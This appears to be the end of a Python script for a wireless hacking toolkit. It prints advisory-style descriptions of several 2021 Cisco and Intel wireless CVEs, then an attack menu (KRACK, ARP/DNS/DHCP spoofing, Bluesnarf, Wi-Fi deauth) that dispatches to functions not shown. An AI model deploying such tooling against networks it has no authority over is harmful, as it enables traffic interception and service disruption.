    CVE-2021-1549 	Multiple vulnerabilities in the web-based management interface of certain Cisco Small Business 100, 300, and 500 Series Wireless Access Points could allow an authenticated, remote attacker to perform command injection attacks against an affected device. These vulnerabilities are due to improper validation of user-supplied input. An attacker could exploit these vulnerabilities by sending crafted HTTP requests to the web-based management interface of an affected system. A successful exploit could allow the attacker to execute arbitrary commands with root privileges on the device. To exploit these vulnerabilities, the attacker must have valid administrative credentials for the device.

    CVE-2021-1548 	Multiple vulnerabilities in the web-based management interface of certain Cisco Small Business 100, 300, and 500 Series Wireless Access Points could allow an authenticated, remote attacker to perform command injection attacks against an affected device. These vulnerabilities are due to improper validation of user-supplied input. An attacker could exploit these vulnerabilities by sending crafted HTTP requests to the web-based management interface of an affected system. A successful exploit could allow the attacker to execute arbitrary commands with root privileges on the device. To exploit these vulnerabilities, the attacker must have valid administrative credentials for the device.

    CVE-2021-1547 	Multiple vulnerabilities in the web-based management interface of certain Cisco Small Business 100, 300, and 500 Series Wireless Access Points could allow an authenticated, remote attacker to perform command injection attacks against an affected device. These vulnerabilities are due to improper validation of user-supplied input. An attacker could exploit these vulnerabilities by sending crafted HTTP requests to the web-based management interface of an affected system. A successful exploit could allow the attacker to execute arbitrary commands with root privileges on the device. To exploit these vulnerabilities, the attacker must have valid administrative credentials for the device.

    CVE-2021-1439 	A vulnerability in the multicast DNS (mDNS) gateway feature of Cisco Aironet Series Access Points Software could allow an unauthenticated, adjacent attacker to cause a denial of service (DoS) condition on an affected device. This vulnerability is due to insufficient input validation of incoming mDNS traffic. An attacker could exploit this vulnerability by sending a crafted mDNS packet to an affected device through a wireless network that is configured in FlexConnect local switching mode or through a wired network on a configured mDNS VLAN. A successful exploit could allow the attacker to cause the access point (AP) to reboot, resulting in a DoS condition.

    CVE-2021-1401 	Multiple vulnerabilities in the web-based management interface of certain Cisco Small Business 100, 300, and 500 Series Wireless Access Points could allow an authenticated, remote attacker to obtain sensitive information from or inject arbitrary commands on an affected device. For more information about these vulnerabilities, see the Details section of this advisory.

    CVE-2021-1400 	Multiple vulnerabilities in the web-based management interface of certain Cisco Small Business 100, 300, and 500 Series Wireless Access Points could allow an authenticated, remote attacker to obtain sensitive information from or inject arbitrary commands on an affected device. For more information about these vulnerabilities, see the Details section of this advisory.

    CVE-2021-1374 	A vulnerability in the web-based management interface of Cisco IOS XE Wireless Controller software for the Catalyst 9000 Family of switches could allow an authenticated, remote attacker to conduct a cross-site scripting (XSS) attack against another user of the web-based management interface of an affected device. The vulnerability is due to insufficient validation of user-supplied input by the web-based management interface of an affected device. An attacker could exploit this vulnerability by authenticating to the device as a high-privileged user, adding certain configurations with malicious code in one of its fields, and persuading another user to click on it. A successful exploit could allow the attacker to execute arbitrary script code in the context of the affected interface or to access sensitive, browser-based information.

    CVE-2021-1373 	A vulnerability in the Control and Provisioning of Wireless Access Points (CAPWAP) protocol processing of Cisco IOS XE Wireless Controller Software for the Cisco Catalyst 9000 Family Wireless Controllers could allow an unauthenticated, remote attacker to cause a denial of service (DoS) condition of an affected device. The vulnerability is due to insufficient validation of CAPWAP packets. An attacker could exploit this vulnerability by sending a malformed CAPWAP packet to an affected device. A successful exploit could allow the attacker to cause the affected device to crash and reload, resulting in a DoS condition.

    CVE-2021-1287 	A vulnerability in the web-based management interface of Cisco RV132W ADSL2+ Wireless-N VPN Routers and Cisco RV134W VDSL2 Wireless-AC VPN Routers could allow an authenticated, remote attacker to execute arbitrary code on an affected device or cause the device to restart unexpectedly. The vulnerability exists because the web-based management interface does not properly validate user-supplied input. An attacker could exploit this vulnerability by sending crafted HTTP requests to an affected device. A successful exploit could allow the attacker to execute arbitrary code as the root user on the underlying operating system or cause the device to reload, resulting in a denial of service (DoS) condition on the affected device.

    CVE-2021-0105 	Insecure inherited permissions in some Intel(R) ProSet/Wireless WiFi drivers may allow an authenticated user to potentially enable information disclosure and denial of service via adjacent access. 
""")
print ("""

#################################
#################################
#    welcome to sus maz         #
#    coded by amiche or yaser   #
#                               #
#################################
#################################
[1] wpa krack 
[2] monitor ssid wifi scanner
[3]dhcp spoof 
[4]blue bug
[5] dns spoof
[6] ip spoof
[7]wlan sniff
[8] blue snarf
[9] arp spoof
[10] wfi death
[11] CVE 2021 wireless
""")

input1 = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+ "SUSmaz"+Fore.BLUE+"~"+Fore.WHITE+"@GEEK"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")
        
try:
    if input1 == "1":
        wpa2_krack()

    elif input1 == "2":
        monitor()

    elif input1 == "3":
        dhcp_spoof()

    elif input1 == "4":
        blue_bug() 

    elif input1 == "5":
        dns_spoof()

    elif input1 == "6":
        ip_spoof()

    elif input1 == "7":
        wlan_sniff()

    elif input1 == "8":
        bluesnarf()

    elif input1 == "9":
        arp_spoof()

    elif input1 == "10":
        wifi_death()

    elif input1 == "11":
        cve()
except:
    print (colorama.Fore.RED+"your number is out of range please try again!")
